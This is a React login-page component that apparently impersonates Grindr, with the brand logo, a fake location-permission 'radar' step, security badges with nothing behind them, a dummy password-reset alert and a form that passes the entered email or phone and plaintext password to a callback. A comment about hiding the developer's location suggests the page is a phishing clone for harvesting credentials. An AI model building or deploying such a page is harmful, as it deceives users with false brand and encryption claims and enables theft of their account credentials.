import React, { useState } from 'react';
import { 
  MapPin, ShieldCheck, Eye, EyeOff, ArrowLeft, 
  Lock, AlertCircle, Compass, Sparkles, Navigation
} from 'lucide-react';
import { GrindrLogo } from './GrindrLogo';

interface LoginFormPageProps {
  onLoginSuccess: (userData: {
    name: string;
    emailOrPhone: string;
    password?: string;
    authMethod: 'email' | 'phone';
    rememberMe?: boolean;
    locationCity?: string;
    coords?: { lat: number; lng: number };
  }) => void;
  onBackToHome: () => void;
}

export const LoginFormPage: React.FC<LoginFormPageProps> = ({
  onLoginSuccess,
  onBackToHome,
}) => {
  // Location gate state - locked to Visitor Web to protect developer privacy
  const [locationAllowed, setLocationAllowed] = useState(false);
  const [locationStatus, setLocationStatus] = useState<'idle' | 'requesting' | 'granted'>('idle');
  const [locationFeedback, setLocationFeedback] = useState<string>('');
  const detectedCity = 'Visitor Web';

  // Login form state (login only)
  const [authMethod, setAuthMethod] = useState<'email' | 'phone'>('email');
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isOver18, setIsOver18] = useState(true);
  const [rememberMe, setRememberMe] = useState(true);
  const [formError, setFormError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Trigger location and proceed directly to form with Visitor Web
  const handleAllowLocation = () => {
    setLocationStatus('requesting');
    setLocationFeedback('Activating Visitor Web Radar...');
    setFormError(null);

    setTimeout(() => {
      setLocationStatus('granted');
      setLocationAllowed(true);
    }, 600);
  };

  // Form submission
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setFormError(null);

    if (!locationAllowed) {
      setFormError('Please allow location access before submitting.');
      return;
    }

    if (!emailOrPhone.trim()) {
      setFormError(authMethod === 'email' ? 'Please enter your email address.' : 'Please enter your phone number.');
      return;
    }

    if (!password.trim() || password.length < 6) {
      setFormError('Password must be at least 6 characters.');
      return;
    }

    if (!isOver18) {
      setFormError('You must confirm you are at least 18 years old to proceed.');
      return;
    }

    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      // Derive display name from email or default
      const derivedName = authMethod === 'email' && emailOrPhone.includes('@')
        ? emailOrPhone.split('@')[0].replace(/[._]/g, ' ')
        : 'User';

      onLoginSuccess({
        name: derivedName || 'User',
        emailOrPhone: emailOrPhone.trim(),
        password: password,
        authMethod: authMethod,
        rememberMe: rememberMe,
        locationCity: 'Visitor Web',
      });
    }, 600);
  };

  return (
    <div className="min-h-screen bg-[#0b0b0c] text-white flex flex-col selection:bg-[#ffce00] selection:text-black relative overflow-x-hidden">
      {/* Background Matrix & Subtle Gradient Glows */}
      <div className="absolute inset-0 bg-world-dots opacity-40 pointer-events-none" />
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[700px] h-[350px] bg-[#ffce00]/10 rounded-full blur-[140px] pointer-events-none" />

      {/* Top Navigation Bar */}
      <header className="sticky top-0 z-40 bg-[#0b0b0c]/90 backdrop-blur-md border-b border-white/10 px-4 sm:px-8 py-3.5 flex items-center justify-between">
        <div className="flex items-center gap-4">
          <button
            onClick={onBackToHome}
            className="flex items-center gap-2 text-xs font-bold text-neutral-300 hover:text-white px-3 py-1.5 rounded-full bg-white/5 hover:bg-white/10 transition-colors cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4 text-[#ffce00]" />
            <span>Back to Home</span>
          </button>

          <div className="hidden sm:block h-4 w-px bg-white/15" />

          <div className="hidden sm:flex items-center gap-2">
            <GrindrLogo height={24} color="#ffffff" />
          </div>
        </div>

        <div className="flex items-center gap-3">
          <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-white/5 border border-white/10 text-[11px] font-semibold text-neutral-300">
            <ShieldCheck className="w-3.5 h-3.5 text-[#00e676]" />
            <span className="hidden xs:inline">100% Discreet & Encrypted</span>
            <span className="xs:hidden">Discreet</span>
          </div>
        </div>
      </header>

      {/* Main Container */}
      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 lg:p-8 relative z-10">
        <div className="w-full max-w-lg">
          {/* ============================================================ */}
          {/* DIRECT LOCATION ACCESS SCREEN (Allow Location Only)          */}
          {/* ============================================================ */}
          {!locationAllowed ? (
            <div className="bg-gradient-to-b from-[#161619] to-[#101012] border border-white/15 rounded-3xl p-6 sm:p-9 shadow-2xl shadow-black/80 backdrop-blur-xl relative overflow-hidden">
              {/* Golden Ambient Ring */}
              <div className="absolute -top-20 -right-20 w-52 h-52 bg-[#ffce00]/15 rounded-full blur-3xl pointer-events-none" />

              {/* Radar Visual */}
              <div className="flex flex-col items-center text-center">
                <div className="relative my-4 flex items-center justify-center">
                  <div className="absolute w-28 h-28 rounded-full border border-[#ffce00]/25 animate-ping pointer-events-none" />
                  <div className="absolute w-20 h-20 rounded-full border border-[#ffce00]/40 pointer-events-none" />
                  
                  <div className="w-20 h-20 rounded-3xl bg-gradient-to-br from-[#ffce00] to-[#e6b800] text-black flex items-center justify-center shadow-2xl shadow-[#ffce00]/30 z-10">
                    <Navigation className="w-9 h-9 fill-black transform -rotate-45" />
                  </div>
                </div>

                <h1 className="text-2xl sm:text-3xl font-display font-black text-white tracking-tight leading-tight mt-1">
                  Allow Location
                </h1>

                <p className="text-neutral-300 text-sm mt-3 leading-relaxed max-w-sm">
                  Enable location to connect with escorts and profiles nearby. Allow location to proceed directly to the sign-in form.
                </p>

                {/* Target Visitor Web Badge */}
                <div className="mt-4 px-3.5 py-2 rounded-full bg-white/5 border border-white/10 text-xs text-neutral-300 flex items-center gap-2 max-w-full">
                  <MapPin className="w-3.5 h-3.5 text-[#ffce00] shrink-0" />
                  <span className="truncate">
                    Radar Connection: <strong className="text-white">Active Online</strong>
                  </span>
                </div>

                {/* Status indicator when acquiring location */}
                {locationFeedback && (
                  <div className="mt-4 w-full p-3.5 rounded-2xl border text-xs flex items-center justify-center gap-2 text-center transition-all bg-white/5 border-white/10 text-neutral-200">
                    <Compass className="w-4 h-4 text-[#ffce00] shrink-0 animate-spin" />
                    <span>{locationFeedback}</span>
                  </div>
                )}

                {/* Action Button: Allow Location Only */}
                <div className="w-full mt-6">
                  <button
                    onClick={handleAllowLocation}
                    disabled={locationStatus === 'requesting'}
                    className="w-full py-4 bg-[#ffce00] hover:bg-[#ebd200] text-black font-black text-base rounded-2xl flex items-center justify-center gap-2 shadow-xl shadow-[#ffce00]/25 transition-transform active:scale-98 disabled:opacity-50 cursor-pointer"
                  >
                    <MapPin className="w-5 h-5 fill-black" />
                    <span>
                      {locationStatus === 'requesting' ? 'Activating Radar...' : 'Allow Location'}
                    </span>
                  </button>
                </div>

                {/* Discreet & SSL note */}
                <div className="mt-6 pt-5 border-t border-white/10 w-full flex items-center justify-around text-[11px] text-neutral-400">
                  <span className="flex items-center gap-1.5">
                    <ShieldCheck className="w-3.5 h-3.5 text-[#00e676]" /> 100% Discreet & Encrypted
                  </span>
                  <span>·</span>
                  <span className="flex items-center gap-1.5">
                    <Lock className="w-3.5 h-3.5 text-[#ffce00]" /> SSL Secure
                  </span>
                </div>
              </div>
            </div>
          ) : (
            /* ============================================================ */
            /* LOGIN INTERFACE (Email / Phone Number)                       */
            /* ============================================================ */
            <div className="bg-gradient-to-b from-[#161619] to-[#101012] border border-white/15 rounded-3xl p-6 sm:p-9 shadow-2xl shadow-black/80 backdrop-blur-xl relative overflow-hidden animate-in fade-in zoom-in-95 duration-300">
              {/* Visitor Location Display: Shows "Visitor Web" (No developer location exposed) */}
              <div className="mb-6 p-3.5 bg-emerald-950/40 border border-emerald-500/30 rounded-2xl flex items-center justify-between text-xs text-emerald-300">
                <div className="flex items-center gap-3 min-w-0">
                  <span className="w-2.5 h-2.5 rounded-full bg-[#00e676] animate-pulse shrink-0" />
                  <div className="min-w-0">
                    <span className="text-[10px] uppercase font-bold text-neutral-400 block tracking-wider">
                      RADAR STATUS
                    </span>
                    <span className="text-white font-bold text-sm truncate block">
                      Active Online
                    </span>
                  </div>
                </div>
                <MapPin className="w-5 h-5 text-[#00e676] shrink-0 ml-2" />
              </div>

              {/* Form Title & Logo */}
              <div className="text-center mb-6">
                <div className="w-12 h-12 bg-[#ffce00] rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg shadow-[#ffce00]/20">
                  <GrindrLogo iconOnly size={28} color="#000000" />
                </div>
                <h2 className="text-2xl sm:text-3xl font-display font-black text-white tracking-tight">
                  Log in with Web
                </h2>
                <p className="text-neutral-400 text-xs sm:text-sm mt-1">
                  Enter your email or phone number to sign in.
                </p>
              </div>

              {/* Form Error Alert */}
              {formError && (
                <div className="mb-4 p-3 bg-rose-950/50 border border-rose-500/40 text-rose-200 rounded-2xl text-xs flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0 text-rose-400" />
                  <span>{formError}</span>
                </div>
              )}

              {/* The Login Form */}
              <form onSubmit={handleSubmit} className="space-y-4">
                {/* Email / Phone Sub-toggle */}
                <div className="flex items-center justify-between text-xs font-semibold px-1">
                  <span className="text-neutral-300">Sign in using:</span>
                  <div className="flex items-center gap-3">
                    <button
                      type="button"
                      onClick={() => setAuthMethod('email')}
                      className={`cursor-pointer ${authMethod === 'email' ? 'text-[#ffce00] font-black underline underline-offset-4' : 'text-neutral-400 hover:text-white'}`}
                    >
                      Email
                    </button>
                    <span className="text-neutral-600">|</span>
                    <button
                      type="button"
                      onClick={() => setAuthMethod('phone')}
                      className={`cursor-pointer ${authMethod === 'phone' ? 'text-[#ffce00] font-black underline underline-offset-4' : 'text-neutral-400 hover:text-white'}`}
                    >
                      Phone Number
                    </button>
                  </div>
                </div>

                {/* Email or Phone Input */}
                <div>
                  <label className="block text-xs font-bold text-neutral-300 mb-1.5">
                    {authMethod === 'email' ? 'Email Address' : 'Mobile Phone Number'}
                  </label>
                  <input
                    type={authMethod === 'email' ? 'email' : 'tel'}
                    value={emailOrPhone}
                    onChange={(e) => setEmailOrPhone(e.target.value)}
                    placeholder={authMethod === 'email' ? 'you@domain.com' : '+1 (555) 000-0000'}
                    className="w-full bg-black/60 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder-neutral-500 focus:outline-none focus:border-[#ffce00] transition-colors"
                    required
                  />
                </div>

                {/* Password Input */}
                <div>
                  <div className="flex items-center justify-between mb-1.5">
                    <label className="text-xs font-bold text-neutral-300">Password</label>
                    <button
                      type="button"
                      onClick={() => alert('Password reset instructions sent to your email/phone.')}
                      className="text-[11px] text-[#ffce00] hover:underline font-semibold"
                    >
                      Forgot Password?
                    </button>
                  </div>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="••••••••"
                      className="w-full bg-black/60 border border-white/10 rounded-xl pl-4 pr-11 py-3 text-sm text-white placeholder-neutral-500 focus:outline-none focus:border-[#ffce00] transition-colors"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3.5 top-1/2 -translate-y-1/2 text-neutral-400 hover:text-white cursor-pointer"
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                {/* Age & Terms verification */}
                <div className="space-y-2 pt-1 text-xs">
                  <label className="flex items-start gap-2.5 cursor-pointer text-neutral-300">
                    <input
                      type="checkbox"
                      checked={isOver18}
                      onChange={(e) => setIsOver18(e.target.checked)}
                      className="mt-0.5 rounded border-white/20 text-[#ffce00] focus:ring-[#ffce00] accent-[#ffce00]"
                      required
                    />
                    <span className="leading-tight">
                      I confirm that I am at least <strong className="text-white">18 years of age</strong> (adult verification).
                    </span>
                  </label>

                  <label className="flex items-center gap-2.5 cursor-pointer text-neutral-400">
                    <input
                      type="checkbox"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="rounded border-white/20 text-[#ffce00] focus:ring-[#ffce00] accent-[#ffce00]"
                    />
                    <span>Remember this session on this device</span>
                  </label>
                </div>

                {/* Primary Submit Button: Exactly "Sign In" */}
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-4 mt-2 bg-[#ffce00] hover:bg-[#ebd200] text-black font-black text-base rounded-2xl shadow-xl shadow-[#ffce00]/25 transition-transform active:scale-98 disabled:opacity-50 cursor-pointer flex items-center justify-center gap-2"
                >
                  <Sparkles className="w-4 h-4 fill-black" />
                  <span>
                    {isSubmitting ? 'Signing In...' : 'Sign In'}
                  </span>
                </button>
              </form>
            </div>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="py-4 text-center text-xs text-neutral-500 border-t border-white/5 relative z-10">
        <p>© 2026 Grindr LLC · 18+ Adult Service & Discreet Connection Network</p>
      </footer>
    </div>
  );
};
